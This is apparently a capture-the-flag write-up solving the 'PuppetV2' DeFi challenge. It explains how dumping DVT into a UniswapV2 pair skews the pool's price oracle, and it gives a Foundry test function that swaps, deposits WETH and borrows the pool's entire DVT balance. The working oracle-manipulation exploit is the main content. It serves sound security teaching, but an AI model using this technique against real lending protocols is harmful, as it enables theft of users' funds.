## PuppetV2 solution

Given 20 ETH and 10000 DVT at the start, we have to steal 1m DVT tokens from the `PuppetV2Pool`. Now it uses UniswapV2 exchange as a price oracle and calculates the amount of WETH needed to deposit before borrowing DVT the following way: 
`amountWETH = (amountDVT * reservesWETH) / reservesDVT`. And this `amountWETH` is then mupliplied by 3, to ensure that the borrower first deposits three times the value in WETH of what he borrows.

Though again, it doesn't prevent price manipulations as we still can swap our 10000 DVT for as much WETH as possible, calling `swapExactTokensForETHSupportingFeeOnTransferTokens` function on `UniswapRouter`

```
    function testExploit() public {
        address[] memory paths = new address[](2);
        address wethPath = address(weth);
        address dvtPath = address(dvt);
        paths[0] = dvtPath;
        paths[1] = wethPath;

        vm.startPrank(attacker);

        // First, we have to take as much ETH as possible from the ETH-DVT Pair
        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            dvt.balanceOf(attacker),
            9e18,
            paths,
            attacker,
            DEADLINE
        );
        assertGt(attacker.balance, ATTACKER_INITIAL_ETH_BALANCE);

        weth.approve(address(pool), attacker.balance);
        weth.deposit{value: attacker.balance}();

        // Then we just simply borrow all the DVT tokens out of the pool
        pool.borrow(dvt.balanceOf(address(pool)));
        validation();
    }
    
    function validation() public {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }
```